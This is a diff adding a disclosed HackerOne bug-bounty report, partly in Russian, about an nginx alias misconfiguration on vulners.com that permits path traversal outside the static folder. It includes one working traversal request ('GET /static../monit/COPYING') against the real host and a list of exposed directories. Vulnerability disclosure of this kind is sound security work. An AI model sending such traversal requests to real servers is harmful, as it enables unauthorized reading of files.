@@ -1,0 +1,38 @@
+ReportLink:https://hackerone.com/reports/317201
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/bobrov
+ReportedTo:vulners.com(vulnerscom)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:03.05.2018 12:08:29
+
+Summary:
+
+Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.
+https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md
+
+Уязвимость только в конфигурации http, на https такого нет.
+
+Пример:
+```http
+GET /static../monit/COPYING HTTP/1.1
+Host: vulners.com
+```
+
+{F264475}
+
+Примеры директорий, которые я обнаружил
+```
+rh/
+nginx/cache/
+monit/bin/monit
+monit/conf/
+monit/man/
+monit/COPYING
+monit/CHANGES
+```
+
+## Impact
+
+Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.
